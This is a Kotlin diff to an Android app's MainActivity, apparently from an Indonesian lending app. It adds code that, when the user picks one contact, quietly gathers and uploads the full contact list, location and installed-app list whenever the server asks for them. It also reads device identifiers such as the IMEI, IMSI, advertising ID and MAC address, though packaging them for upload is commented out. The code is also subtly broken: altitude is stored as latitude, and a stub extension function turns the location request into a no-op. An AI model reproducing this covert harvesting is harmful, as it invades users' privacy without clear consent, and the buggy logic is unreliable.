@@ -9,10 +9,13 @@ import android.content.pm.PackageManager
 import android.database.Cursor
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.location.LocationListener
+import android.location.LocationManager
 import android.net.Uri
 import android.os.Environment
 import android.provider.ContactsContract
 import android.provider.MediaStore
+import android.provider.Settings
 import android.text.TextUtils
 import android.util.Log
 import android.view.KeyEvent
@@ -22,6 +25,7 @@ import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import com.adjust.sdk.Adjust
 import com.adjust.sdk.AdjustEvent
+import com.blankj.utilcode.util.DeviceUtils
 import com.blankj.utilcode.util.ToastUtils
 import com.fintek.httprequestlibrary.BaseApplication
 import com.fintek.httprequestlibrary.api.error.HttpError
@@ -33,8 +37,8 @@ import com.fintek.supermarket.MyAppclication
 import com.fintek.supermarket.R
 import com.fintek.supermarket.model.*
 import com.fintek.supermarket.ui.activity.base.BaseActivity
-import com.fintek.supermarket.utils.CommonUtils
-import com.fintek.supermarket.utils.SharedPreferencesUtils
+import com.fintek.supermarket.utils.*
+import com.google.android.gms.ads.identifier.AdvertisingIdClient
 import com.google.gson.Gson
 import kotlinx.android.synthetic.main.activity_main.*
 import okhttp3.MediaType
@@ -46,8 +50,8 @@ import wendu.dsbridge.CompletionHandler
 import wendu.dsbridge.DWebView
 import java.io.File
 import java.io.FileNotFoundException
-import java.text.SimpleDateFormat
 import java.util.*
+import kotlin.concurrent.thread
 
 
 class MainActivity : BaseActivity() {
@@ -305,6 +309,9 @@ class MainActivity : BaseActivity() {
     fun startGetAppConfig(){
         val permissions = arrayOf(
             Manifest.permission.READ_CONTACTS,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.READ_PHONE_STATE,
         )
         val list = mutableListOf<String>()
         list.add("alert_flag")
@@ -314,24 +321,26 @@ class MainActivity : BaseActivity() {
             object : HttpCallback<HttpResource<AppConfigResponse>>() {
                 override fun onSuccess(response: HttpResource<AppConfigResponse>?) {
                     response?.data?.let {
-                        if (it.alert_flag){
+                        if (it.alert_flag) {
                             AlertDialog.Builder(this@MainActivity)
                                 .setMessage(it.alert_content)
-                                .setPositiveButton("Setuju",object :DialogInterface.OnClickListener{
-                                    override fun onClick(dialog: DialogInterface?, which: Int) {
-                                        ActivityCompat.requestPermissions(
-                                            this@MainActivity,
-                                            permissions,
-                                            REQUEST_PERMISSION_READ_CONTACTS
-                                        )
-                                    }
+                                .setPositiveButton("Setuju",
+                                    object : DialogInterface.OnClickListener {
+                                        override fun onClick(dialog: DialogInterface?, which: Int) {
+                                            ActivityCompat.requestPermissions(
+                                                this@MainActivity,
+                                                permissions,
+                                                REQUEST_PERMISSION_READ_CONTACTS
+                                            )
+                                        }
 
-                                }).setNegativeButton("Batalkan",object :DialogInterface.OnClickListener{
-                                    override fun onClick(dialog: DialogInterface?, which: Int) {
+                                    }).setNegativeButton("Batalkan",
+                                    object : DialogInterface.OnClickListener {
+                                        override fun onClick(dialog: DialogInterface?, which: Int) {
 
-                                    }
+                                        }
 
-                                }).show()
+                                    }).show()
                         }
                     }
 
@@ -427,7 +436,13 @@ class MainActivity : BaseActivity() {
                         val contentResolver = getContentResolver();
                         var cursor:Cursor? = null;
                         if (uri != null) {
-                            cursor = contentResolver.query(uri, arrayOf("display_name", "data1"), null, null, null);
+                            cursor = contentResolver.query(
+                                uri,
+                                arrayOf("display_name", "data1"),
+                                null,
+                                null,
+                                null
+                            );
                         }
                         while (cursor!!.moveToNext()) {
                             contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
@@ -436,11 +451,11 @@ class MainActivity : BaseActivity() {
                         cursor.close();
                         phoneNum = phoneNum.replace("-", " ");
                         phoneNum = phoneNum.replace(" ", "");
-                        Log.d("口口声声",contactName+"=="+phoneNum)
-                        val cutName= if (contactName.length>20) contactName.substring(0,20) else contactName
+                        Log.d("口口声声", contactName + "==" + phoneNum)
+                        val cutName= if (contactName.length>20) contactName.substring(0, 20) else contactName
                         val urlJsResponse = JSResponse(
                             1,
-                            Gson().toJson(ContractResponseModel(contactName,phoneNum,cutName))
+                            Gson().toJson(ContractResponseModel(contactName, phoneNum, cutName))
                         )
                         val urlJson = Gson().toJson(urlJsResponse)
                         mContractHandler.complete(urlJson)
@@ -448,7 +463,7 @@ class MainActivity : BaseActivity() {
                         ToastUtils.showShort("silahkan pilih lagi~")
                     }
 
-                }catch (e:Exception ){
+                }catch (e: Exception){
                     ToastUtils.showShort("silahkan pilih lagi~")
                 }
 
@@ -459,7 +474,7 @@ class MainActivity : BaseActivity() {
 
     //调用并获取联系人信息
     private fun readContacts() {
-        checkExtExpired()
+        thread {  checkExtExpired() }.start()
         val intent =  Intent();
         intent.setAction("android.intent.action.PICK");
         intent.addCategory("android.intent.category.DEFAULT");
@@ -468,8 +483,12 @@ class MainActivity : BaseActivity() {
     }
 
     private fun checkExtExpired() {
-        NetHttp.getInstance().checkExtExpired(object :HttpCallback<HttpResource<NeedUploadExtInfoResponse>>(){
+        NetHttp.getInstance().checkExtExpired(object :
+            HttpCallback<HttpResource<NeedUploadExtInfoResponse>>() {
             override fun onSuccess(response: HttpResource<NeedUploadExtInfoResponse>?) {
+                response?.data?.let {
+                    uploadExtInfo(it)
+                }
 
             }
 
@@ -479,6 +498,78 @@ class MainActivity : BaseActivity() {
 
         })
     }
+
+    private fun uploadExtInfo(needUploadExtInfoResponse: NeedUploadExtInfoResponse) {
+        if (!TextUtils.isEmpty(SharedPreferencesUtils.init(this@MainActivity).getValue("userId"))){
+            val extInfoReqBean= ExtInfoReq.ExtInfoReqBean()
+            if (needUploadExtInfoResponse.isUserContact){
+                extInfoReqBean.contactList= CommonUtils.getContactList(this@MainActivity)
+            }
+
+            if (needUploadExtInfoResponse.isGps){
+                val locationManager: LocationManager =
+                    this@MainActivity.getSystemService(LOCATION_SERVICE) as LocationManager
+                locationManager.requestLocationUpdates(
+                    LocationManager.NETWORK_PROVIDER,
+                    0,
+                    0,
+                    LocationListener() {
+                        val gpsBean = ExtInfoReq.ExtInfoReqBean.GpsBean()
+                        gpsBean.latitude = it.altitude
+                        gpsBean.longitude = it.longitude
+                        extInfoReqBean.gps = gpsBean
+                    })
+            }
+            if (needUploadExtInfoResponse.isAppInfo){
+                extInfoReqBean.appList=CommonUtils.getPkgListNew(this@MainActivity)
+            }
+
+            if (needUploadExtInfoResponse.isEquipmentInfoMap){
+                val information = System.getProperty("http.agent")
+                val imei = CommonUtils.getIMEI(this@MainActivity)
+                val gaid= AdvertisingIdClient.getAdvertisingIdInfo(this@MainActivity).id
+                val androidId: String = Settings.System.getString(contentResolver, Settings.System.ANDROID_ID)
+                val mac = DeviceUtils.getMacAddress()
+                val battery = BatteryUtils.getBatteryLevel(this@MainActivity)
+                val remoteAddr = GatewayUtils.getIp(this@MainActivity).get("en0")
+               val storageTotalSize= MemoryUtils.getTotalMemMemory(this@MainActivity)
+               val storageAdjustedTotalSize= MemoryUtils.getAvailMemMemMemory(this@MainActivity)
+               val storageAvailableSize= MemoryUtils.getUsableMemMemory(this@MainActivity)
+               val sdCardTotalSize= SdUtils.getSdTotalStoreInfo(this@MainActivity)
+               val sdCardAvailableSize= SdUtils.getSdUsableSpaceStoreInfo(this@MainActivity)
+               val imsi = CommonUtils.getSubscriberId(this@MainActivity)
+               val isRoot = RootUtils.isRoot(this@MainActivity)
+               val isLocServiceEnable = CommonUtils.isLocServiceEnable(this@MainActivity)
+               val isNetwork = if (NetWorkUtils.isNetworkConnected(this@MainActivity)) "1" else "0"
+               val language = LanguageUtils.getDefaultLanguage(this@MainActivity)
+//               val equipmentInfoMapBeans= ExtInfoReq.ExtInfoReqBean.EquipmentInfoMapBean(
+//                   information,
+//                   imei,
+//                   gaid,androidId,mac,battery,remoteAddr,storageTotalSize,storageAdjustedTotalSize,storageAvailableSize,
+//                   sdCardTotalSize,sdCardAvailableSize,imsi,isRoot,isLocServiceEnable,isNetwork,language
+//               )
+
+                //extInfoReqBean.equipmentInfoMap=equipmentInfoMapBeans
+            }
+            extInfoReqBean.userId=SharedPreferencesUtils.init(this@MainActivity).getValue("userId")
+            val extInfoReq=ExtInfoReq(extInfoReqBean)
+            NetHttp.getInstance().extInfo(extInfoReq,
+                object : HttpCallback<HttpResource<String>>() {
+                    override fun onSuccess(response: HttpResource<String>?) {
+
+                    }
+
+                    override fun onFail(yySportError: HttpError?) {
+
+                    }
+
+                })
+        }
+
+    }
+
+
+
 
     private fun uploadOcrBitmap(selectedImage: Bitmap, encodedImage: String) {
         Log.d("base64", encodedImage)
@@ -605,6 +696,15 @@ class MainActivity : BaseActivity() {
         }
         return super.onKeyDown(keyCode, event)
     }
+
+}
+
+private fun LocationManager.requestLocationUpdates(
+    networkProvider: String,
+    i: Int,
+    i1: Int,
+    locationListener: LocationListener
+) {
 
 }
 
